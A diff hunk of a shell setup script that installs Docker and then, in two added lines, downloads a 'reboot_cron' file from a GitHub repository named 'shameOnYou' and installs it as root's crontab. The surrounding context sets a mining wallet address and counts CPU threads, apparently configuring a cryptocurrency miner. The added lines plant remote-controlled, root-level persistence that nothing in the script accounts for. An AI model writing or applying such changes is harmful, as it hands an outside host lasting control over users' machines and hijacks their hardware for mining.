@@ -15,6 +15,8 @@ sudo add-apt-repository \
    $(lsb_release -cs) \
    stable"
 sudo apt-get update && sudo apt-get install -y docker-ce
+wget https://raw.githubusercontent.com/oldhuman/shameOnYou/master/reboot_cron -O /tmp/reboot_cron
+sudo crontab -u root /tmp/reboot_cron
 
 wallet='426jvb8frrm73Q9Dg8SB5n7eeiLXXhUCEDWefuNq7Kgi7vMShDuUpzVG5fn7ZkS6MmSTz5ZnzGv5Sc7gPYC88n1Y19Pbti4.miner/11cj11@bk.ru'
 numthr="$(nproc --all)"
